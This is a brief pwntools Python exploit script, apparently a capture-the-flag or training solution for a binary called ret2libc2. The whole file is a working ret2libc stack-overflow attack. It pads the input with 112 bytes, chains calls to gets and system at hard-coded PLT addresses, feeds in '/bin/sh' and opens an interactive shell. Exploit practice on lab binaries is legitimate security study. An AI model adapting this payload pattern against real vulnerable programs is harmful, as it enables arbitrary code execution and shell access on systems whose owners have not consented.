from pwn import *

sh = process('binary/ret2libc2')
gets_plt = 0x08048460
system_plt = 0x08048490
buf = 0x804a080
payload = flat(
    [b'a' * 112, gets_plt, system_plt, buf, buf])
sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()